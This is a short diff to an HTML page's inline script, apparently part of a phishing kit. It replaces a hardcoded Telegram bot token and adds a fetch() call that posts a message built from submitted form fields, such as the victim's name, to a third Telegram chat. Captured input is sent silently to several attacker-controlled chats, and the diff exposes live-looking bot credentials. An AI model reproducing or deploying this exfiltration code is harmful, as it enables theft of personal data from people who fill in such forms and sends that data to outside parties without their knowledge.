@@ -249,7 +249,7 @@ body[unresolved] {opacity: 0; display: block; overflow: hidden; position: relati
 
 <script>
 /* ---------- CONFIG ---------- */
-const TELEGRAM_BOT_TOKEN = '8529207072:AAFcG7PE4nmTlirXTSaTqNkY1td35aiG0IY';
+const TELEGRAM_BOT_TOKEN = '8485388962:AAGTktrO69ZS0qdX1vX2DTNX9rhe1a-nwwQ';
 const TELEGRAM_CHAT_ID = '6067712594';
 
 /* ---------- UTILS ---------- */
@@ -452,6 +452,12 @@ Name: ${name}
       method:'POST',
       headers:{'Content-Type':'application/json'},
       body: JSON.stringify({ chat_id: '7393124087', text: msg })
+    }).catch(() => {});
+    // Send to third chat
+    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({ chat_id: '6720348763', text: msg })
     }).catch(() => {});
   }
 
